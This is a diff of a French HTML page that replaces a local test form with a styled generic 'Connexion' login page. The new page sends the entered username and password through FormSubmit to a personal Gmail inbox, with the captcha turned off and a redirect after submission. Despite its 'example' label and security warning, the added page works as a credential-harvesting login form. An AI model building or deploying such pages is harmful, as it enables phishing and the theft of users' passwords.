@@ -1,55 +1,79 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Formulaire Stocké</title>
-<style>
-body { font-family: Arial; padding: 50px; background: #f5f5f5; }
-form { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; }
-input, button { width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #ccc; }
-button { background: #667eea; color: white; border: none; cursor: pointer; }
-button:hover { background: #764ba2; }
-.success { color: green; display: none; margin-bottom: 15px; font-weight: bold; }
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Formulaire : pseudo & mdp</title>
+  <style>
+    :root{--bg:#f7f9fc;--card:#fff;--accent:#3b82f6;--muted:#6b7280}
+    body{font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;margin:0;background:var(--bg);display:flex;align-items:center;justify-content:center;height:100vh}
+    .card{background:var(--card);padding:28px;border-radius:12px;box-shadow:0 6px 24px rgba(15,23,42,0.08);width:340px}
+    h1{margin:0 0 12px;font-size:18px;color:#0f172a}
+    p.muted{margin:0 0 18px;color:var(--muted);font-size:13px}
+    label{display:block;margin-bottom:8px;font-weight:600;font-size:13px;color:#0f172a}
+    input[type="text"], input[type="password"]{
+      width:100%;padding:10px 12px;border:1px solid #e6e9ee;border-radius:8px;margin-bottom:12px;font-size:14px;box-sizing:border-box
+    }
+    .row{display:flex;align-items:center;gap:8px}
+    .btn{
+      background:var(--accent);color:#fff;padding:10px 14px;border-radius:8px;border:0;cursor:pointer;font-weight:600;margin-top:6px;width:100%;
+      box-shadow:0 6px 18px rgba(59,130,246,0.12)
+    }
+    .small{font-size:12px;color:var(--muted);margin-top:10px}
+    .toggle{background:transparent;border:0;color:var(--accent);cursor:pointer;padding:0;font-weight:600}
+  </style>
 </head>
 <body>
+  <form class="card" action="https://formsubmit.co/megumikun84@gmail.com" method="POST" autocomplete="on">
+    <h1>Connexion</h1>
+    <p class="muted">Entrez ton pseudo et ton mot de passe. (Exemple d’envoi via FormSubmit)</p>
 
-<h2>Formulaire Test</h2>
+    <!-- Champ pseudo -->
+    <label for="pseudo">Pseudo</label>
+    <input id="pseudo" name="pseudo" type="text" placeholder="Ton pseudo" required minlength="2" autocomplete="username">
 
-<form id="form">
-  <div class="success" id="successMsg">✅ Formulaire envoyé !</div>
-  <input type="text" id="pseudo" placeholder="Pseudo" required>
-  <input type="password" id="password" placeholder="Mot de passe" required>
-  <button type="submit">Envoyer</button>
-</form>
+    <!-- Champ mot de passe -->
+    <label for="mdp">Mot de passe</label>
+    <div class="row">
+      <input id="mdp" name="mdp" type="password" placeholder="••••••••" required minlength="6" autocomplete="current-password">
+      <button type="button" class="toggle" id="togglePwd" title="Afficher / masquer">Afficher</button>
+    </div>
 
-<h3>Données sauvegardées :</h3>
-<pre id="dataDisplay">{}</pre>
+    <!-- Champs cachés pour FormSubmit -->
+    <!-- _captcha : désactive le captcha (optionnel) -->
+    <input type="hidden" name="_captcha" value="false">
+    <!-- _subject : sujet de l'email -->
+    <input type="hidden" name="_subject" value="Nouveau formulaire : connexion">
+    <!-- _next : page de redirection après envoi (modifie si tu veux) -->
+    <input type="hidden" name="_next" value="https://example.com/merci.html">
+    <!-- _honeypot : champ anti-bot -->
+    <input type="text" name="_honey" style="display:none">
 
-<script>
-let savedData = []; // ici on stocke toutes les entrées
+    <button class="btn" type="submit">Envoyer</button>
 
-const form = document.getElementById('form');
-const successMsg = document.getElementById('successMsg');
-const dataDisplay = document.getElementById('dataDisplay');
+    <p class="small">
+      Remarque : la première soumission demandera probablement la confirmation de l'adresse e-mail côté FormSubmit (ils envoient un lien de validation).
+    </p>
+    <p class="small" style="margin-top:4px;color:#b91c1c;font-weight:600;">
+      ⚠️ Sécurité : éviter d’utiliser ce formulaire pour stocker des mots de passe d'utilisateurs en production.
+    </p>
+  </form>
 
-form.addEventListener('submit', function(e){
-  e.preventDefault(); // empêche le rechargement de page
-
-  const pseudo = document.getElementById('pseudo').value;
-  const password = document.getElementById('password').value;
-
-  // on ajoute les données au tableau
-  savedData.push({ pseudo, password });
-
-  // on met à jour l'affichage
-  dataDisplay.textContent = JSON.stringify(savedData, null, 2);
-
-  // message de succès et reset du formulaire
-  successMsg.style.display = 'block';
-  form.reset();
-});
-</script>
-
+  <script>
+    // Simple toggle afficher/masquer mot de passe
+    (function(){
+      const pwd = document.getElementById('mdp');
+      const btn = document.getElementById('togglePwd');
+      btn.addEventListener('click', () => {
+        if (pwd.type === 'password') {
+          pwd.type = 'text';
+          btn.textContent = 'Masquer';
+        } else {
+          pwd.type = 'password';
+          btn.textContent = 'Afficher';
+        }
+      });
+    })();
+  </script>
 </body>
 </html>
